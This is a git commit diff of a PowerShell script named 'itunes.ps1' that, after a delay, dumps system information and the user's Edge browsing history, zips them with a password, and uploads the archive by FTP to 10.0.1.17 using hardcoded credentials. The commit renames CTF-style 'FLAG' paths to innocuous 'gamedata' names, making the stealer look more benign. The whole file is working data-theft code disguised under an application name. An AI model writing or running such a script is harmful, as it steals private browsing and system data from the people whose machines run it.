315a50590196cb16ab8ff03790750071824190d4
m122 <michael.sterrett@gmail.com>
2025-03-19 16:52:58 -0400

    Update itunes.ps1

--- itunes.ps1
+++ itunes.ps1
@@ -1,15 +1,15 @@
 Start-Sleep -Seconds 100
-systeminfo > C:\Windows\Temp\FLAG099\FLAG024.txt
+systeminfo > C:\Windows\Temp\gamedata\systeminfo.txt
 $browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
-cp $browsing_history_file_path C:\Windows\Temp\FLAG796
+cp $browsing_history_file_path C:\Windows\Temp\gamedata
 # Set the path to the 7-Zip executable (replace with your actual path)
 $zipExePath = "C:\Program Files\7-Zip\7z.exe"
 
 # Set the path to the folder you want to zip
-$folderToZip = "C:\Windows\Temp\FLAG099"
+$folderToZip = "C:\Windows\Temp\gamedata"
 
 # Set the path for the output zip file
-$zipFilePath = "C:\Windows\Temp\FLAG553.zip"
+$zipFilePath = "C:\Windows\Temp\gamedata.zip"
 
 # Set the password for the zip file
 $zipPassword = "batman"
@@ -21,4 +21,4 @@ Write-Host "Folder successfully zipped and password-protected. Zip file: $zipFil
 
 $client = New-Object System.Net.WebClient
 $client.Credentials = New-Object System.Net.NetworkCredential("elliot", "Password1")
-$client.UploadFile("ftp://10.0.1.17/FLAG553.zip","C:\Windows\Temp\FLAG553.zip")
+$client.UploadFile("ftp://10.0.1.17/gamedata.zip","C:\Windows\Temp\gamedata.zip")
